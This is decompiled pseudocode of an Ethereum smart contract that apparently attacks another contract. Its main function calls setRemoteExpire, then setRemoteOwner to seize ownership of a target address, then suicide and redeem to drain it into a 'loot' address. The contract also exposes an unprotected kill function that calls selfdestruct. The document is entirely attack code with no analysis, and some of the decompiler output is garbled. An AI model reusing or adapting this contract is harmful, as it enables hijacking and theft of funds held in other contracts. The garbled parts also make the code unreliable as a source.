contract main {


// =======================  Init code  ======================


uint256 stor0;

function _fallback() payable {
    stor0 = msg.sender or Mask(96, 160, stor0)
    return code.data[36 len 1094]
}



// =====================  Runtime code  =====================


uint256 stor0;
address thisAddress;
uint256 stor1;
address targetAddress;
uint256 stor2;
address lootAddress;
uint256 stor3;
uint256 loot;
uint256 expiration;
uint8 sub_507476b0;
uint8 sub_f0ea593d; offset 8
uint8 sub_0c98a1db; offset 16
uint8 sub_59555464; offset 24
uint256 stor6; offset 24
uint256 stor6; offset 16
uint256 stor6; offset 8
uint256 stor6;

function sub_0c98a1db(?) payable {
    return sub_0c98a1db
}

function lootAddress() payable {
    return address(lootAddress)
}

function expiration() payable {
    return expiration
}

function sub_507476b0(?) payable {
    return sub_507476b0
}

function targetAddress() payable {
    return address(targetAddress)
}

function sub_59555464(?) payable {
    return sub_59555464
}

function loot() payable {
    return loot
}

function thisAddress() payable {
    return address(thisAddress)
}

function sub_f0ea593d(?) payable {
    return sub_f0ea593d
}

function kill(address arg1) payable {
    selfdestruct(arg1)
}

function _fallback() payable {
  stop
}

function sub_53f52f54(?) payable {
    expiration = 0
}

function sub_d21f1583(?) payable {
    stor0 = arg1 or Mask(96, 160, stor0)
}

function transfer(address arg1, uint256 arg2) payable {
    call arg1 with:
       value arg2 wei
         gas 95000 wei
    if not ext_call.success:
        return 0
    return 1
}

function sub_a237de6c(?) payable {
    uint256(stor1) = this.address or Mask(96, 160, uint256(stor1))
    uint256(stor2) = arg1 or Mask(96, 160, uint256(stor2))
    uint256(stor3) = arg2 or Mask(96, 160, uint256(stor3))
    loot = arg3
    expiration = 0
    call address(arg1) with:
       funct Mask(32, 224, 'setRemoteExpire') >> 224
         gas gas_remaining - 25050 wei
        args Mask(224, 0, 'setRemoteExpire')
    uint256(stor6.field_0) = Mask(248, 0, stor6.field_8)
    call address(targetAddress) with:
       funct Mask(32, 224, 'setRemoteOwner') >> 224
         gas gas_remaining - 25050 wei
        args Mask(224, 0, 'setRemoteOwner'), address(thisAddress)
    Mask(248, 0, stor6.field_8) = Mask(248, 0, ext_call.success)
    call address(targetAddress) with:
       funct Mask(32, 224, 'suicide') >> 224
         gas gas_remaining - 25050 wei
        args Mask(224, 0, 'suicide'), address(targetAddress)
    Mask(240, 0, stor6.field_16) = Mask(240, 0, ext_call.success)
    call address(targetAddress) with:
       funct Mask(32, 224, 'redeem') >> 224
         gas gas_remaining - 25050 wei
        args Mask(224, 0, 'redeem')
    Mask(232, 0, stor6.field_24) = Mask(232, 0, ext_call.success)
    call address(targetAddress).'Fe	m' with:
         gas gas_remaining - 25050 wei
    require ext_call.success
    if block.timestamp <= ext_call.return_data[0]:
        return 0
    return 1
}



}
